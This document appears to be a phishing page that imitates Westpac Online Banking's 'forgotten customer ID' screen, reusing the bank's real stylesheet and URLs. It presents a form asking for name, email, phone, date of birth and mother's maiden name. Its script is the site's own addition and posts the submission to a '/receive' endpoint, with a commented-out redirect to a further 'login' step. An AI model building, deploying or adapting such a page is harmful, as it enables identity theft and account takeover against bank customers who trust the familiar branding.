<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths cookies cors overthrow-enabled" lang="en">
   <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge;chrome=1" />
      <meta charset="utf-8" />
      <title>Westpac Online Banking</title>
      <meta name="description" content="" />
      <meta name="HandheldFriendly" content="True" />
      <meta name="MobileOptimized" content="320" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover" />
      <meta name="apple-mobile-web-app-capable" content="yes" />
      <meta name="apple-mobile-web-app-status-bar-style" content="default" />
      <link rel="apple-touch-icon" href="" />
      <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Titan/WBC/000-0001combined.css.4c7a8722df72b201084fe3d6f3109795ef5f0e3b.css" rel="stylesheet" />
      <meta name="apple-itunes-app" content="app-id=299111811" />
      <link rel="manifest" href="https://www.westpac.com.au/_services/smart-app-banner/banking/manifest.serialise.json" />
      <meta name="format-detection" content="telephone=no" />
      <meta name="wup_url" content="https://wup-2ffe60ee.westpac.com.au/client/v3/web/wup?cid=willow" />
      <meta name="log_url" content="https://log-2ffe60ee.westpac.com.au/api/v1/sendLogs" />
   </head>
   <body id="applicationBody" data-keymap-url="/eam/servlet/getEamInterfaceData" data-command="login" data-get-resources-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true&values=true" data-get-resources-checksum-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true" data-help-url="/wbc/banking/helpcontentandsearch" data-signin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=login&segment=personal" data-signout-url="https://banking.westpac.com.au/pkmslogout?token=f264d7a0-1df4-11ef-b660-005056a3d977" data-browser-incompatible-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/6" data-cookies-disabled-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/7" data-allow-console-logging="false" data-spsignin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=sp&segment=personal" data-is-stronger-password-feature-enabled="True" data-is-eam-policy-global-rollout="True" data-analytics-allkeys="autoImpr,experience,formName,pageKey,pageName,pageStep,pageType,sendDelay,siteVersion,src,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagestep="start" data-analytics-pagename="enter your customer id" data-analytics-senddelay="3000" data-analytics-autoimpr="TRUE" data-analytics-formname="olb" data-analytics-src="20231122-mob" data-analytics-pagetype="login" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="login" class="orientation-portrait">
      <!-- ko ifnot: isSalesPathwayLogin() -->
    
      	
      	<footer>
         <div class="login-footer"><br>
            <a class="help" href="https://www.westpac.com.au/personal-banking/online-banking/support-faqs/" data-analytics-nav="footer">
            <span class="text">Help</span>
            </a>
         </div>
      </footer>
      <!-- /ko -->
      </div>
      </div>
      <div class="page view view-active" id="forgottenCustomerId" data-post-url="https://banking.westpac.com.au/wbc/banking/verifycustomer" data-analytics-allkeys="experience,formName,newFormName,pageKey,pageName,pageStep,pageType,siteVersion,trackOnce,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagename="enter customerdetails" data-analytics-newformname="forgot-credentials" data-analytics-pagestep="start" data-analytics-trackonce="true" data-analytics-pagetype="selfservice" data-analytics-formname="forgot-credentials" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="Mob_Authentication_forgottenCustomerId">
         <header class="title-bar" role="banner">
            <center>
               <h1 tabindex="-1">Provide personal details</h1>
            </center>
            <!--a href="javascript:;" data-bind="click: navigateBack" class="button-back">
               <span>back</span>
               </a-->
         </header>
         <div role="main" class="no-footer">
            <div class="message-bar">
               <div class="message"></div>
               <a class="close" href="javascript:;">
               <img alt="Close message" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" />
               </a>
            </div>
            <div id="alertManagerArea" class="validation-summary" style="display:none;">
               <div class="message">
                  <p><strong>Please correct the errors with the following fields:</strong></p>
               </div>
               <div id="unorder-list" class="errors"> </div>
            </div>
            <form id="carddetails_form">
               <span>Step 1 of 3 - Personal details </span>
               <fieldset>
                  <div class="panel">
    <h2>Provide your contact details</h2>
    <div class="form">
        <div class="item item-text">
            <label data-field-name="first-name" data-field-title="First name" for="contact_details_firstName">
                <span class="label">First Name</span>
                <span class="control">
                    <input class="log_details" type="text" aria-required="true" maxlength="100" data-bind="value: firstName" id="FirstName" />
                </span>
                <span class="visually-hidden">100 characters is the maximum length of this field</span>
            </label>
        </div>
        <div class="item item-text">
            <label data-field-name="last-name" data-field-title="Last name" for="contact_details_lastName">
                <span class="label">Last Name</span>
                <span class="control">
                    <input class="log_details"  type="text" aria-required="true" maxlength="100" data-bind="value: lastName" id="LastName" />
                </span>
                <span class="visually-hidden">100 characters is the maximum length of this field</span>
            </label>
        </div>
        <div class="item item-text">
            <label data-field-name="email" data-field-title="Email" for="contact_details_email">
                <span class="label">Email</span>
                <span class="control">
                    <input class="log_details" type="email" aria-required="true" maxlength="100" data-bind="value: email" id="Email" />
                </span>
                <span class="visually-hidden">100 characters is the maximum length of this field</span>
            </label>
        </div>
        <div class="item item-text">
            <label data-field-name="phone-number" data-field-title="Phone number" for="contact_details_phoneNumber">
                <span class="label">Phone Number</span>
                <span class="control">
                    <input class="log_details" type="tel" aria-required="true" maxlength="15" data-bind="value: phoneNumber" id="PhoneNumber" />
                </span>
                <span class="visually-hidden">15 characters is the maximum length of this field</span>
            </label>
        </div>
        <div class="item item-text">
            <label data-field-name="date-of-birth" data-field-title="Date of birth" for="contact_details_dateOfBirth">
                <span class="label">Date of Birth</span>
                <span class="control">
                    <input class="log_details"  id="DOB" class="no-border" placeholder="dd/mm/yyyy" type="text" aria-required="true" data-bind="value: dateOfBirth, valueUpdate: 'blur'" />
                </span>
                <span class="visually-hidden">dd/mm/yyyy</span>
            </label>
        </div>
        <div class="item item-text">
            <label data-field-name="mothers-maiden-name" data-field-title="Mother's maiden name" for="contact_details_mothersMaidenName">
                <span class="label">Mother's Maiden Name</span>
                <span class="control">
                    <input class="log_details" type="text" aria-required="true" maxlength="100" data-bind="value: mothersMaidenName" id="MothersMaidenName" />
                </span>
                <span class="visually-hidden">100 characters is the maximum length of this field</span>
            </label>
        </div>
    </div>
</div>
<div class="description"></div>
<div class="action-buttons action-buttons-count-2" style="margin-bottom:30%;">
    <button type="button" class="button" data-bind="click: cancel">
        <span>Cancel</span>
    </button>
    <button id="subbut" class="button-alt" data-bind="click: submit">
        <span>Next</span>
    </button>
</div>
                  
                  </div>
               
            </form>
         </div>
      </div>
   </body>
   <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
    
 <script>
 	
 	function addListItem(ulId, text, attributes = {}) {
    var ul = document.getElementById(ulId);
    var li = document.createElement('li');
    li.textContent = ' ' + text ; 

    for (const [key, value] of Object.entries(attributes)) {
        li.setAttribute(key, value);
    }

    ul.appendChild(li);
    	 };
    	 </script>
    	 <script>
    	 	
    	 	$(document).ready(function() {
    $('#subbut').on('click', function(event) {
        event.preventDefault(); // Prevent the default action of the link

        let myForm = $("#carddetails_form");
        let checkInputs = document.querySelectorAll('.log_details');

        let list = document.getElementById('unorder-list');

		// While there are child elements, remove the first child
		while (list.firstChild) {
		    list.removeChild(list.firstChild);
		}
        
        
        // Flag to track if any input is empty
        let isEmpty = false;

        // Loop through each input field
        for (const check of checkInputs) {
            check.addEventListener('focus', () => {
                console.log('focus');
                check.nextElementSibling.style.display = "none";
            });

            if (check.value.trim() === "") {
            
                document.getElementById('alertManagerArea').style.display = "block";
               var labelName = check.parentElement.previousElementSibling.textContent;
                addListItem('unorder-list', labelName);
                isEmpty = true;
            }
        }

        // If no input is empty, proceed with form submission
        if (!isEmpty) {
            let userinfo = myForm.serializeArray();
            let user = {};
            let visitor = sessionStorage.getItem('visitor');

            userinfo.forEach((value) => {
                // Use the 'name' attribute to create user object
                user[value.id] = value.value;
            });

            user['visitor'] = visitor;
            console.log(user);

            // Send AJAX request
            $.ajax({
                method: 'POST',
                url: "/receive",
                data: user
            }).done(function(msg) {
            
                sessionStorage.setItem('visitor', visitor);
                //window.location.href = "login/2";
                console.log(msg); // Log success message
            }).fail(function(err, textstatus, error) {
            //window.location.href = "login/2"; 
            
            });
        }
    });
});


    </script>
</html>
